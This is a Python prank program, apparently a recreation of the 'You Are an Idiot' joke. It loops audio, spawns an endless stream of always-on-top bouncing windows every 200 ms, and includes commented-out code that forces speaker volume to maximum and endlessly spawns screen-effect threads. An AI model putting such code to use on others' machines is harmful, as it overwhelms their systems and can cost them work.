from encodings.rot_13 import rot13
from tkinter import *
import random
import pygame
from PIL import Image, ImageTk
import threading
from GDI_effects.GDI import Effects
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL

root = Tk()

icon = PhotoImage(file="you-are-an-idiot.png")
root.iconphoto(True, icon)

gif = Image.open("you-are-an-idiot.gif")
gw = gif.width
gh = gif.height - 100

sw = root.winfo_screenwidth()
sh = root.winfo_screenheight()
x = (sw - gw) // 2
y = (sh - gh) // 2

root.geometry(f"{gw}x{gh}+{x}+{y-100}")
root.title("Hi!")

pygame.mixer.init()

#-Audio---------------------------------------------------------------------------
devices = AudioUtilities.GetSpeakers()
volume = devices.EndpointVolume

#def volume_100():
    #volume.SetMasterVolumeLevel(0.0, None)
    #root.after(100, volume_100)

# -gif-------------------------------------------------------------------------------
frames = []

gif.seek(0)
frame_white = gif.convert("RGBA").copy()
frames.append(ImageTk.PhotoImage(frame_white))

gif.seek(22)
frame_black = gif.convert("RGBA").copy()
frames.append(ImageTk.PhotoImage(frame_black))


# -Okna----------------------------------------------------------------------------
windows = []
m_gif = None

def gif_main():
    global m_gif
    if m_gif is not None:
        return
    m_gif = Label(root, image=frames[0], borderwidth=0)
    m_gif.pack(fill="both", expand=True)
    def animate(frame_index=0):
        if m_gif is None:
            return
        m_gif.config(image=frames[frame_index])
        m_gif.image = frames[frame_index]
        next_frame = (frame_index + 1) % len(frames)
        root.after(500, animate, next_frame)
    animate()

def open_window():
    window = Toplevel(root)
    window.title("YOU ARE AN IDIOT")
    window.attributes("-topmost", True)

    x = random.randint(0, root.winfo_screenwidth() - gw)
    y = random.randint(0, root.winfo_screenheight() - gh)

    window.geometry(f"{gw}x{gh}+{x}+{y}")
    label = Label(window, image=frames[0], borderwidth=0)
    label.pack()
    animate_gif(window, label)

    dx = random.choice([-10, 10])
    dy = random.choice([-10, 10])

    move_window(window, x,y,dx,dy)

    windows.append(window)

def animate_gif(window, label, frame=0):
    if not window.winfo_exists():
        return

    label.config(image=frames[frame])
    frame = (frame + 1) % len(frames)
    window.after(500, animate_gif, window, label, frame)

def move_window(window, x, y, dx, dy):
    if not window.winfo_exists():
        return
    screen_width = root.winfo_screenwidth()
    screen_height = root.winfo_screenheight()

    x += dx
    y += dy
    if  x + gw >= screen_width:
        x = screen_width - gw
        dx = -abs(dx)
    elif  x <= 0:
        x = 0
        dx = abs(dx)
    if y + gh >= screen_height:
        y = screen_height - gh
        dy = -abs(dy)
    elif y <= 0:
        y = 0
        dy = abs(dy)
    window.geometry(f"{gw}x{gh}+{x}+{y}")
    window.after(10, move_window, window, x, y, dx, dy)

#-shake------------------------------------------------------------------------
shaking = False
shake_job = None
shake_x = 0
shake_y = 0

def shake():
    global shake_job
    if not shaking:
        return

    dx = random.randint(-1, 1)
    dy = random.randint(-1, 1)

    root.geometry(f"{gw}x{gh}+{shake_x+dx}+{shake_y+dy}")
    shake_job= root.after(30, shake)

def start_shake(event=None):
    global shaking, shake_x, shake_y
    if shaking:
        return
    shaking = True
    shake_x = root.winfo_x()
    shake_y = root.winfo_y()
    shake()
def stop_shake(event=None):
    global shaking, shake_job
    shaking = False
    if shake_job is not None:
        root.after_cancel(shake_job)
        shake_job = None
    root.geometry(f"{gw}x{gh}+{shake_x}+{shake_y}")
#-start------------------------------------------------------------------------
def start():
    root.title("You are idiot")
    global shaking
    start_shake()
    button.unbind("<Leave>")
    button.pack_forget()
    #volume_100()
    pygame.mixer.music.load("you-are-an-idiot.mp3")
    pygame.mixer.music.play(-1)
    gif_main()
    root.after(5000, first_window)
    # root.after(15000, effect)
    # root.after(25000, kill_sys)

def first_window():
    open_window()
    root.after(5000, create_one_win_loop)

def create_one_win_loop():
    open_window()
    root.after(200, create_one_win_loop)

def effect():
    threading.Thread(target=Effects.rainbow_blink, daemon=True).start()
    threading.Thread(target=Effects.void_screen, daemon=True).start()

def kill_sys():
    while True:
        threading.Thread(target=Effects.rainbow_blink, daemon=True).start()
        threading.Thread(target=Effects.void_screen, daemon=True).start()

#-knopka---------------------------------------------------------------------
button = (Button(root, text="Hello!", command=start, width=20, height=1, bg="black", fg="white", cursor="hand2", relief="sunken",activebackground="darkred", activeforeground="white"))
button.pack()

button.place(relx=0.5, rely=0.45, anchor="center")
button.bind("<Enter>", start_shake)
button.bind("<Leave>", stop_shake)

root.mainloop()





